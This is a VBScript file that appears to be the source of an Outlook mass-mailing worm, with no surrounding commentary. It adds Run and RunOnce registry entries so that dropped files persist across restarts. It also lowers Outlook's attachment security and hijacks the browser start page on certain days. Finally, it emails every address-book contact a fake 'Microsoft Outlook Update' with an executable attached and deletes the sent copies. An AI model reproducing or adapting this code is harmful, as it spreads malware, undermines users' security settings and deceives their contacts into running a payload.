   On Error Resume Next
   Set DcXmkdXewreh = CreateObject("WScript.Shell")
   Set bRsJhdblaYr = CreateObject("Scripting.FileSystemObject")
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce\wincomp32\", "WINDOWS\system32\nstdnrdll32.vbs"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\nldr32\", "WINDOWS\system32\NonYou.exe"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Outlook\Security\Level1Remove", "exe"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Outlook\Security\Level1Remove", "exe"
   DcXmkdXewreh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Outlook\Security\Level1Remove", "exe"
   If Day(Now) = 11 Or  Day(Now) = 23 Then Call lSXmWeqGfBv
   Call WeqGfEwBnzPu
   Sub lSXmWeqGfBv()
   DcXmkdXewreh.regWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.gedzac.tk"
   DcXmkdXewreh.Run "\WINDOWS\system32\About.hta"
   End Sub
   Sub WeqGfEwBnzPu()
   Set OutlookApp = CreateObject("Outlook.Application")
   Set GNS = OutlookApp.GetNameSpace("MAPI")
   For List1 = 1 To GNS.AddressLists.Count
   CountLoop = 1
   For ListCount = 1 To GNS.AddressLists(List1).AddressEntries.Count
   Set OutlookEmail = OutlookApp.CreateItem(0)
   OutlookEmail.Recipients.Add (GNS.AddressLists(List1).AddressEntries(CountLoop))
   OutlookEmail.Subject = "Microsoft Outlook News"
   OutlookEmail.Body = "Microsoft Outlook Update / Bug Fixed - Contact: support@microsoft.com"
   OutlookEmail.Attachments.Add ("\WINDOWS\system32\MSOutlookInternetUpdate.exe")
   OutlookEmail.Importance = 2
   OutlookEmail.DeleteAfterSubmit = True
   OutlookEmail.Send
   CountLoop = CountLoop + 1
   Next
   Next
   DcXmkdXewreh.Run "http://www.windowsupdate.com"
   End Sub
